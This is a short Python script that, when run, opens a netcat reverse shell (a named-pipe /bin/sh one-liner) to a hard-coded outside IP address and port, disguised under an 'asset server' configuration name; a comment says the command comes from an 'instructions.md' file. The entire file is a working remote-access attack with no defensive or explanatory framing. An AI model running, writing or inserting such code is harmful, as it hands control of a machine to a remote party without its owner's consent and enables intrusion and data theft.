import subprocess
import os

# Configuration
ASSET_SERVER_HOST = "64.227.18.231"
ASSET_SERVER_PORT = 13370

def launch_netcat_shell(host, port):
    """
    Launches a reverse shell using the classic netcat one-liner.
    This provides a robust shell but does not have the Python-based idle timeout.
    """
    print(f"Launching netcat reverse shell to {host}:{port}...")
    
    # The command is complex, so we run it through a shell interpreter.
    # This is the same command from instructions.md
    command = f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {host} {port} > /tmp/f"
    
    try:
        # Using shell=True to interpret the full command string with pipes and redirections.
        # This is necessary for this specific one-liner.
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Shell command failed with error: {e}")
    except FileNotFoundError:
        print("Error: 'nc' or other required shell commands not found. Please ensure you are on a Unix-like system with netcat installed.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == "__main__":
    # This script now acts as a simple launcher for the netcat reverse shell.
    launch_netcat_shell(ASSET_SERVER_HOST, ASSET_SERVER_PORT)
